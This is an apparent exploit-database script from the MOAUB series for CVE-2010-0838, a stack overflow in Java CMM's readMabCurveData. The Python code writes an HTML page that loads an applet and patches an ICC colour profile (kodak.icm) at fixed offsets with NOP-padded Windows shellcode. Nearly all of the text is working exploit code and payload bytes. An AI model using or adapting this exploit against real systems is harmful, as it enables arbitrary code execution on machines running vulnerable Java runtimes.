'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

'''

'''
  Title             : Java CMM readMabCurveData stack overflow
  Version           : Java runtime < 6.19 
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.java.com
  Impact            : Critical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-0838
  MOAUB Number      : MOAUB_20_BA

http://www.exploit-db.com/moaub-20-java-cmm-readmabcurvedata-stack-overflow/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15056.zip (moaub-20-exploit.zip)
'''

import sys

def main():
   
    try:
		strHTML = '''
		<HTML>
		<HEAD>
		</HEAD>
		<BODY>
		<H1>You have exploited!!!</H1>
		<P><APPLET code="Curve.class" WIDTH="600" HEIGHT="400">
		</APPLET></P>
		</BODY>
		</HTML>		'''
		fHTML = open('index.html', 'w')
		fHTML.write(strHTML)
		fHTML.close()
		fdR = open('kodak.icm', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:9154]
		str2 = strTotal[9648:]
		shellcode = '\xEB\x6B\x5A\x31\xC9\x6A\x10\x52\x42\x52\x51\xFF\xD0\x53\x68\x7E\xD8\xE2\x73\xFF\xD6\x6A\x00\xFF\xD0\xFF\xD7\x50\x68\xA8\xA2\x4D\xBC\xFF\xD6\xE8\xDA\xFF\xFF\xFF\x00\x54\x68\x65\x20\x65\x78\x70\x6C\x6F\x69\x74\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x21\x00\x5E\x6A\x30\x59\x64\x8B\x19\x8B\x5B\x0C\x8B\x5B\x1C\x8B\x1B\x8B\x5B\x08\x53\x68\x8E\x4E\x0E\xEC\xFF\xD6\x89\xC7\xE8\xB3\xFF\xFF\xFF\x55\x53\x45\x52\x33\x32\x00\xE8\xD3\xFF\xFF\xFF\x53\x55\x56\x57\x8B\x6C\x24\x18\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x32\x49\x8B\x34\x8B\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38\xE0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\xEB\x02\x31\xC0\x5F\x5E\x5D\x5B\xC2\x08\x00'
		
		if len(shellcode) > 494:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 494:
			dif = 494 - len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
		fdW= open('kodak.icm', 'wb+')
		fdW.write(str1)
		fdW.write(shellcode)
		fdW.write(str2)
		fdW.close()
		fdR.close()
		print '[-] Html file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()